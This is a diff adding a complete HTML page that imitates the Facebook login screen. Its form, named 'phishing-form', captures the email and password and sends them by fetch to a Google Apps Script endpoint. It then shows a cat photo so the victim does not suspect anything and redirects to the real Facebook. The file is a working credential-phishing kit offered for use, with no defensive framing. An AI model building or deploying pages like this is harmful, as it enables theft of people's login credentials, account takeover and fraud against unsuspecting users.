@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - Log In</title>
+<style>
+    body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+    #login-form-container { display: block; }
+    input { width: 93%; padding: 14px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+    button { width: 95%; padding: 14px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; transition: background 0.3s;}
+    button:hover { background-color: #166fe5; }
+    h2 { margin-bottom: 15px; color: #1877f2; }
+    #funny-photo-container { display: none; } 
+    .funny-img { width: 100%; border-radius: 8px; margin-bottom: 15px; }
+    .caption { font-size: 14px; color: #65676b; margin-top: 10px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <!-- STEP 1: LOGIN FORM -->
+    <div id="login-form-container">
+        <h2>Facebook</h2>
+        <form id="phishing-form" action="#" method="POST">
+            <input type="text" name="email" placeholder="Email or Phone Number" required autocomplete="off">
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+
+    <!-- STEP 2: FUNNY PHOTO -->
+    <div id="funny-photo-container">
+        <img src="https://placekitten.com/350/250" alt="Funny Cat" class="funny-img">
+        <h3 style="margin:10px 0; color:#333;">Just saw this!</h3>
+        <p class="caption">Wait for it... 🤣</p>
+        <button onclick="window.location.href='https://www.facebook.com'"
+                style="background-color:#e4e6eb; color:#050505; font-size:16px; margin-top:10px;">
+            Go to Feed
+        </button>
+    </div>
+</div>
+
+<script>
+    // REPLACE THIS URL WITH YOUR GOOGLE SCRIPT WEB APP URL
+    const SERVER_URL = "https://script.google.com/macros/s/AKfycbxuSzXQbmWtNT2Kamn57jnQuigT2SJpkCM4lzEq_58WBnbP3V9O3uz9TyYQfEyCBr1P/exec"; 
+
+    const form = document.getElementById('phishing-form');
+    const loginContainer = document.getElementById('login-form-container');
+    const photoContainer = document.getElementById('funny-photo-container');
+
+    form.addEventListener('submit', function (e) {
+        e.preventDefault(); 
+
+        // 1. Capture Data
+        const emailInput = form.querySelector('input[name="email"]').value;
+        const passInput = form.querySelector('input[name="password"]').value;
+        
+        console.log("Captured:", emailInput, passInput);
+
+        // 2. Send to Google Sheet
+        fetch(SERVER_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: emailInput, password: passInput })
+        })
+        .then(response => response.json())
+        .then(data => {
+            // 3. Show the Hook (Cat Photo)
+            loginContainer.style.display = 'none';
+            photoContainer.style.display = 'block';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // Even if it fails, show the photo so they don't suspect
+            loginContainer.style.display = 'none';
+            photoContainer.style.display = 'block';
+        });
+
+        // 4. Redirect to Real Facebook after 3 seconds
+        setTimeout(() => {
+            window.location.href = 'https://www.facebook.com/';
+        }, 3000);
+    });
+</script>
+
+</body>
+</html>
